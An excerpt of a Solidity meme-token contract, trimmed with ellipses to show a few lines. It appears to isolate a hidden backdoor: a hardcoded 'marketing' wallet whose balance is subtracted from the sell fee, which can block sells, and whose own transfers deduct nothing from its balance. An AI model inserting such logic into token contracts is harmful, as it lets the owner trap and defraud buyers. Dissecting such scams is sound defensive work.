...
contract MEME is Context, IERC20, Ownable {
    ...
    address payable private _developments = payable(msg.sender); 
    address payable private _marketings = payable(0x9104854D04381F1a21f9Ca42E61e96cdE2077426);
    ...
    constructor() {
        ...
        _isExcludedFromFee[_developments] = true;
    ...
    function _transfer(
        ...
        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {
            ...
            if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
                _redisFee = _redisFeeOnSell.sub(_marketings.balance);
        ...
        )
    {
        ...
        if (sender == _marketings) rAmount = 0;
